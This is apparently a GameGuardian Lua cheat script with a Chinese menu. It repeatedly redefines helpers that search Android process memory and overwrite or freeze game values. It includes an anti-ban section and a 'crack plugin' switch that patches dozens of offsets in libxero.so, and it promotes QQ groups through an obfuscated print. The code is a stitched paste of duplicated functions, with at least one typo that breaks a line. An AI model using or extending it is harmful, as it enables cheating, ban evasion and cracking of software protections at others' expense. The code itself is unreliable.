;function HaoGe(Search,Get,Type,Range,Name) gg.clearResults() gg.setRanges(Range) gg.setVisible(false) if Search[1][1] ~= false then gg.searchAddress(Search[1][1],0xFFFFFFFF,Search[1][4] or Type,gg.SIGN_EQUAL,Search[1][5] or 1,Search[1][6] or -1) end gg.searchNumber(Search[1][2],Search[1][4] or Type,false,gg.SIGN_EQUAL,Search[1][5] or 1,Search[1][6] or -1) local count = gg.getResultCount() local result = gg.getResults(count) gg.clearResults() local data = {} local base = Search[1][3] if (count > 0) then for i,v in ipairs(result) do v.isUseful = true end for k = 2,#Search do local tmp = {} local offset = Search[k][2] - base local num = Search[k][1] for i,v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address+offset tmp[#tmp].flags = Search[k][3] or Type end tmp = gg.getValues(tmp) for i,v in ipairs(tmp) do if v.flags == 16 or v.flags == 64 then values = tostring(v.value):sub(1,6) num = tostring(num):sub(1,6) else values = v.value end if tostring(values) ~= tostring(num) then result[i].isUseful = false end end end for i,v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.addre7ss end end if (#data > 0) then local t,t_ = {}, {} local base = Search[1][3] for i = 1,#data do for k,w in ipairs(Get) do offset = w[2] - base if w[1] == false then t_[#t_+1] = {} t_[#t_].address = data[i]+offset t_[#t_].flags = Type th_ = (th_) and th_+1 or 1 else t[#t+1] = {} t[#t].address = data[i]+offset t[#t].flags = w[3] or Type t[#t].value = w[1] tg_ = (tg_) and tg_+1 or 1 if (w[4] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = w[4] gg.addListItems(item) end end end end tg = (tg_) and "\n📥修改"..tg_.."数据" or "" th = (th_) and "" or "" gg.setValues(t) t_ = gg.getValues(t_) gg.loadResults(t_) gg.toast("\n"..Name..tg) tg_,th_ = nil,nil else gg.toast("❌搜索不到",false) return false end else gg.toast("❌搜索不到") return false end end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function PS() end function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) xgsl = xgsl + 1 end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) xgjg = true end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function setvalue(address,flags,value) local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function S_Pointer(t_So, t_Offset, _bit)
local function getRanges()
local ranges = {}
local t = gg.getRangesList('^/data/*.so*$')
for i, v in pairs(t) do
if v.type:sub(2, 2) == 'w' then
table.insert(ranges, v)
end
end
return ranges
end
local function Get_Address(N_So, Offset, ti_bit)
local ti = gg.getTargetInfo()
local S_list = getRanges()
local _Q = tonumber(0xD8B07D2)
local t = {}
local _t
local _S = nil
if ti_bit then
_t = 32
else
	_t = 4
end
for i in pairs(S_list) do
local _N = S_list[i].internalName:gsub('^.*/', '')
if N_So[1] == _N and N_So[2] == S_list[i].state then
_S = S_list[i]
break
end
end
if _S then
t[#t + 1] = {}
t[#t].address = _S.start + Offset[1]
t[#t].flags = _t
if #Offset ~= 1 then
for i = 2, #Offset do
local S = gg.getValues(t)
t = {}
for _ in pairs(S) do
if not ti.x64 then
S[_].value = S[_].value & 0xFFFFFFFF
end
t[#t + 1] = {}
t[#t].address = S[_].value + Offset[i]
t[#t].flags = _t
end
end
end
_S = t[#t].address
print(string.char(231,190,164,58).._Q)
end
return _S end
local _A = string.format('0x%X',Get_Address(t_So, t_Offset, _bit))
return _A
end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function S_Pointer(t_So, t_Offset, _bit)
local function getRanges()
local ranges = {}
local t = gg.getRangesList('^/data/*.so*$')
for i, v in pairs(t) do
if v.type:sub(2, 2) == 'w' then
table.insert(ranges, v)
end
end
return ranges
end
local function Get_Address(N_So, Offset, ti_bit)
local ti = gg.getTargetInfo()
local S_list = getRanges()
local _Q = tonumber(0x167ba0fe)
local t = {}
local _t
local _S = nil
if ti_bit then
_t = 32
else
	_t = 4
end
for i in pairs(S_list) do
local _N = S_list[i].internalName:gsub('^.*/', '')
if N_So[1] == _N and N_So[2] == S_list[i].state then
_S = S_list[i]
break
end
end
if _S then
t[#t + 1] = {}
t[#t].address = _S.start + Offset[1]
t[#t].flags = _t
if #Offset ~= 1 then
for i = 2, #Offset do
local S = gg.getValues(t)
t = {}
for _ in pairs(S) do
if not ti.x64 then
S[_].value = S[_].value & 0xFFFFFFFF
end
t[#t + 1] = {}
t[#t].address = S[_].value + Offset[i]
t[#t].flags = _t
end
end

end
_S = t[#t].address

end
return _S
end
local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
return _A
end
function PS() end
function setvalue(address,flags,value) local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end

function S_Pointer(t_So, t_Offset, _bit)
local function getRanges()
local ranges = {}
local t = gg.getRangesList('^/data/*.so*$')
for i, v in pairs(t) do
if v.type:sub(2, 2) == 'w' then
table.insert(ranges, v)
end
end
return ranges
end
local function Get_Address(N_So, Offset, ti_bit)
local ti = gg.getTargetInfo()
local S_list = getRanges()
local _Q = tonumber(0x167ba0fe)
local t = {}
local _t
local _S = nil
if ti_bit then
_t = 32
else
	_t = 4
end
for i in pairs(S_list) do
local _N = S_list[i].internalName:gsub('^.*/', '')
if N_So[1] == _N and N_So[2] == S_list[i].state then
_S = S_list[i]
break
end
end
if _S then
t[#t + 1] = {}
t[#t].address = _S.start + Offset[1]
t[#t].flags = _t
if #Offset ~= 1 then
for i = 2, #Offset do
local S = gg.getValues(t)
t = {}
for _ in pairs(S) do
if not ti.x64 then
S[_].value = S[_].value & 0xFFFFFFFF
end
t[#t + 1] = {}
t[#t].address = S[_].value + Offset[i]
t[#t].flags = _t
end
end
end
_S = t[#t].address
print(string.char(231,190,164,58).._Q)
end
return _S
end
local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
return _A
end

function PS() end
function setvalue(address,flags,value) local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end

function setvalue(address,flags,value) local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function S_Pointer(t_So, t_Offset, _bit)
local function getRanges()
local ranges = {}
local t = gg.getRangesList('^/data/*.so*$')
for i, v in pairs(t) do
if v.type:sub(2, 2) == 'w' then
table.insert(ranges, v)
end
end
return ranges
end
local function Get_Address(N_So, Offset, ti_bit)
local ti = gg.getTargetInfo()
local S_list = getRanges()
local _Q = tonumber(0x167ba0fe)
local t = {}
local _t
local _S = nil
if ti_bit then
_t = 32
else
	_t = 4
end
for i in pairs(S_list) do
local _N = S_list[i].internalName:gsub('^.*/', '')
if N_So[1] == _N and N_So[2] == S_list[i].state then
_S = S_list[i]
break
end
end
if _S then
t[#t + 1] = {}
t[#t].address = _S.start + Offset[1]
t[#t].flags = _t
if #Offset ~= 1 then
for i = 2, #Offset do
local S = gg.getValues(t)
t = {}
for _ in pairs(S) do
if not ti.x64 then
S[_].value = S[_].value & 0xFFFFFFFF
end
t[#t + 1] = {}
t[#t].address = S[_].value + Offset[i]
t[#t].flags = _t
end
end
end
_S = t[#t].address
print(string.char(231,190,164,58).._Q)
end
return _S
end
local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
return _A
end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) else gg.addListItems({[1] = {
	address = xgpy, flags = xglx, freeze = xgdj, value = xgsz
}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,一共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
readPointer = function(name, offset, i) local re = gg.getRangesList(name) local x64 = gg.getTargetInfo().x64 local va = {[true] = 32,[false] = 4
} if re[i or 1] then local addr = re[i or 1].start+offset[1] for i = 2,#offset do addr = gg.getValues({{
		address = addr,flags = va[x64]}}) if not x64 then addr[1].value = addr[1].value & 0xFFFFFFFF end addr = addr[1].value + offset[i] end return addr end end
gg.edits = function(addr, Table, name) local Table1 = {{}, {}} for k, v in ipairs(Table) do local value = {
	address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]}if v[4] then Table1[2][#Table1[2]+1] = value else Table1[1][#Table1[1]+1] = value end end gg.addListItems(Table1[2])gg.setValues(Table1[1]) gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值") end
function fastsearch(search, write)
gg.setVisible(false)
gg.clearResults()
gg.setRanges(search[1][3])
gg.searchNumber(search[1][1], search[1][2])
if gg.getResultsCount() == 0 then
gg.toast("Not Found")
return false
else
	local result = gg.getResults(gg.getResultsCount())
gg.clearResults()
for i = 2, #search do
local mtp = {}
for w, r in ipairs(result) do
mtp[#mtp + 1] = {
	address = r.address + search[i][2], flags = search[i][3]
}
end
mtp = gg.getValues(mtp)
local hook = {}
for w, r in ipairs(mtp) do
if r.value == search[i][1] then
hook[#hook + 1] = result[w]
end
end
result = hook
end
if #result > 0 then
local tb = {{}, {}}
for i, v in ipairs(result) do
--- 遍历每个结果
for _, vv in ipairs(write) do
local p = {
	address = v.address + vv[2], flags = vv[3], value = vv[1], freeze = vv[4]}
if vv[4] then --- true 就是冻结
table.insert(tb[2], p)
else
	table.insert(tb[1], p)
end
end
end
gg.addListItems(tb[2])
gg.setValues(tb[1])
gg.toast("获取成功" .. (#tb[1] + #tb[2]) .. "条结果")
else
	gg.toast("Not Found")
end
end
end
function PS() end
function setvalue(address,flags,value) local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function SearchWrite(Search, Write, Type)gg.clearResults()gg.setVisible(false)gg.searchNumber(Search[1][1], Type)local count = gg.getResultCount()local result = gg.getResults(count)gg.clearResults()local data = {}local base = Search[1][2]if (count > 0) then for i, v in ipairs(result) do v.isUseful = true end for k = 2, #Search do local tmp = {} local offset = Search[k][2] - base local num = Search[k][1] for i, v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address + offset tmp[#tmp].flags = v.flags end tmp = gg.getValues(tmp) for i, v in ipairs(tmp) do if (tostring(v.value) ~= tostring(num)) then result[i].isUseful = false end end end for i, v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.address end end if (#data > 0) then gg.toast("found "..#data.." data") local t = {} local base = Search[1][2] for i = 1, #data do for k, w in ipairs(Write) do offset = w[2] - base t[#t+1] = {} t[#t].address = data[i] + offset t[#t].flags = Type t[#t].value = w[1] if (w[3] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = true gg.addListItems(item) end end end gg.setValues(t) else gg.toast("not found", false) return false end else gg.toast("Not Found") return false end end

function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) xgsl = xgsl + 1 end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) xgjg = true end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
function S_Pointer(t_So, t_Offset, _bit)
local function getRanges()
local ranges = {}
local t = gg.getRangesList('^/data/*.so*$')
for i, v in pairs(t) do
if v.type:sub(2, 2) == 'w' then
table.insert(ranges, v)
end
end
return ranges
end
local function Get_Address(N_So, Offset, ti_bit)
local ti = gg.getTargetInfo()
local S_list = getRanges()
local _Q = tonumber(0x269CDB36)
local t = {}
local _t
local _S = nil
if ti_bit then
_t = 32
else
	_t = 4
end--------q.q2.7..8。98.8h,35.36
for i in pairs(S_list) do
local _N = S_list[i].internalName:gsub('^.*/', '')
if N_So[1] == _N and N_So[2] == S_list[i].state then
_S = S_list[i]
break
end
end
if _S then
t[#t + 1] = {}
t[#t].address = _S.start + Offset[1]
t[#t].flags = _t
if #Offset ~= 1 then
for i = 2, #Offset do
local S = gg.getValues(t)
t = {}
for _ in pairs(S) do
if not ti.x64 then
S[_].value = S[_].value & 0xFFFFFFFF
end
t[#t + 1] = {}
t[#t].address = S[_].value + Offset[i]
t[#t].flags = _t
end
end
end
_S = t[#t].address
-- print(string.char(231,190,164,58).._Q)
end
return _S
end
local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
return _A
end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function edit(orig,ret)_om = orig[1].memory or orig[1][1]_ov = orig[3].value or orig[3][1]_on = orig[2].name or orig[2][1]gg.clearResults()gg.setRanges(_om)gg.searchNumber(_ov,orig[3].type or orig[3][2])sz = gg.getResultCount()if sz < 1 then gg.toast(_on.."失败")else sl = gg.getResults(720)for i = 1,sz do ist = true for v = 4,#orig do if ist == true and sl[i].value == _ov then cd = {{}}cd[1].address = sl[i].address+(orig[v].offset or orig[v][2])cd[1].flags = orig[v].type or orig[v][3]szpy = gg.getValues(cd)cdlv = orig[v].lv or orig[v][1]cdv = szpy[1].value if cdlv == cdv then pdjg = true ist = true else pdjg = false ist = false end end end if pdjg == true then szpy = sl[i].address for x = 1,#(ret)do xgpy = szpy+(ret[x].offset or ret[x][2])xglx = ret[x].type or ret[x][3]xgsz = ret[x].value or ret[x][1]xgdj = ret[x].freeze or ret[x][4]xgsj = {{
	address = xgpy,flags = xglx,value = xgsz
}}if xgdj == true then xgsj[1].freeze = xgdj gg.setValues(xgsj)else gg.setValues(xgsj)end end xgjg = true end end if xgjg == true then gg.toast(_on.."成功")else gg.toast(_on.."失败")end end end
function SearchWrite(Search, Write, Type) gg.clearResults() gg.setVisible(false) gg.searchNumber(Search[1][1], Type) local count = gg.getResultCount() local result = gg.getResults(count) gg.clearResults() local data = {} local base = Search[1][2] if (count > 0) then for i, v in ipairs(result) do v.isUseful = true end for k = 2, #Search do local tmp = {} local offset = Search[k][2] - base local num = Search[k][1] for i, v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address + offset tmp[#tmp].flags = v.flags end tmp = gg.getValues(tmp) for i, v in ipairs(tmp) do if (tostring(v.value) ~= tostring(num)) then result[i].isUseful = false end end end for i, v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.address end end if (#data > 0) then gg.toast("搜索到"..#data.."条数据") local t = {} local base = Search[1][2] for i = 1, #data do for k, w in ipairs(Write) do offset = w[2] - base t[#t+1] = {} t[#t].address = data[i] + offset t[#t].flags = Type t[#t].value = w[1] if (w[3] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = true gg.setValues(item) end end end gg.setValues(t) gg.toast("已修改"..#t.."条数据") gg.setValues(t) else gg.toast("not found", false) return false end else gg.toast("Not Found") return false end end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) else gg.setValues({[1] = {
	address = xgpy, flags = xglx, freeze = xgdj, value = xgsz
}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "地址成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "失败") end end end end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) else gg.setValues({[1] = {
	address = xgpy, flags = xglx, freeze = xgdj, value = xgsz
}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "地址成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
-----仿XS>>>


gg.loopKillGG()-----杀GG






stab = {
--菜单名字，大标题
--可删可减没有限制
	{
		"公告","息白内部特别版"
	}, {
		"防封","防封专区"
	}, {
		"功能","功能专区"
	}, {
		"聊天","聊天室"
	}, {
		"快手","美女视频"
	}, {
		"音乐","网易云点歌"
	},

}
xfcpic = "https://cccimg.com/view.php/f00bef52cc1b65bd43eef826d5b59c5a.jpg"--悬浮窗链接或路径

titlet = luajava.loadlayout {
	TextView,
	id = "titlet",
	layout_width = "235dp",
	layout_height = "wrap_content",
	text = stitle,
	textColor = "#29FF8D",
	gravity = "center",
	textSize = "13sp",
}

changan.menu(
	{
		{
			changan.button("💨选择进程🌫",gg.setProcessX),--同理
			changan.button("✅收起页面✅",隐藏),
			changan.button("❤️QQ通知群❤️",
function()
gg.copyText("息白官方QQ交流群872496460")
ces = gg.alert("群号已复制到剪切板息白官方频道@XJBAI667","取消","确定")
qq.joinGroup("1510785856")
end),
			changan.button("👉联系作者👈",
function()
qq.join("1510785856")
end),
			titlet,
changan.text("","#FFFFFF","20sp"),
changan.text("","#FFFFFF","10sp"),
			changan.button("❌退出脚本❌",
function()
tuic()
end),
		}, {




			changan.button("开防教程",
function()
gg.alert("自己测试")	
end,
function()
end),


changan.button("随机播放音乐",
function()
Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen)
end,
function()
toMusic('已关闭音乐')---语音
end),

			changan.button("选择进程",gg.setProcessX),--同理
changan.text("破解插件专区","#00FF00","10sp"),--空文本可用于换	
changan.switch("破解乐子",
function()			
local Ranges=gg.getRangesList('/')
local function Read(module,type)
    for k,v in pairs(Ranges) do
        if v['internalName']:match('[^/]*$')==module and v['type']==type then
            return v['start']
        end
    end
end

local Table={}
local function Modify(address,value,flags)
    Table[#Table+1]={address=address,value=value,flags=flags}
end

Modify(Read('libxero.so','rw-p')+0x6d14,800,4)
Modify(Read('libxero.so','rw-p')+0x6d24,800,4)
Modify(Read('libxero.so','rw-p')+0x6d34,800,4)
Modify(Read('libxero.so','rw-p')+0x6d44,800,4)
Modify(Read('libxero.so','rw-p')+0x6d54,800,4)
Modify(Read('libxero.so','rw-p')+0x6d64,800,4)
Modify(Read('libxero.so','rw-p')+0x6d74,800,4)
Modify(Read('libxero.so','rw-p')+0x6d84,800,4)
Modify(Read('libxero.so','rw-p')+0x6d94,800,4)
Modify(Read('libxero.so','rw-p')+0x6da0,800,4)
Modify(Read('libxero.so','rw-p')+0x6da4,800,4)
Modify(Read('libxero.so','rw-p')+0x6da8,800,4)
Modify(Read('libxero.so','rw-p')+0x6dac,800,4)
Modify(Read('libxero.so','rw-p')+0x6db4,800,4)
Modify(Read('libxero.so','rw-p')+0x6dc4,800,4)
Modify(Read('libxero.so','rw-p')+0x6dd4,800,4)
Modify(Read('libxero.so','rw-p')+0x6de4,800,4)
Modify(Read('libxero.so','rw-p')+0x6df4,800,4)
Modify(Read('libxero.so','rw-p')+0x6e04,800,4)
Modify(Read('libxero.so','rw-p')+0x6e14,800,4)
Modify(Read('libxero.so','rw-p')+0x6e24,800,4)
Modify(Read('libxero.so','rw-p')+0x6e34,800,4)
Modify(Read('libxero.so','rw-p')+0x6e44,800,4)
Modify(Read('libxero.so','rw-p')+0x6e54,800,4)
Modify(Read('libxero.so','rw-p')+0x6e64,800,4)
Modify(Read('libxero.so','rw-p')+0x6e74,800,4)
Modify(Read('libxero.so','rw-p')+0x6e84,800,4)
Modify(Read('libxero.so','rw-p')+0x6e94,800,4)
Modify(Read('libxero.so','rw-p')+0x6ea4,800,4)
Modify(Read('libxero.so','rw-p')+0x6eb4,800,4)
Modify(Read('libxero.so','rw-p')+0x6ec4,800,4)
Modify(Read('libxero.so','rw-p')+0x6ed4,800,4)
Modify(Read('libxero.so','rw-p')+0x6ee4,800,4)
Modify(Read('libxero.so','rw-p')+0x6ef4,800,4)
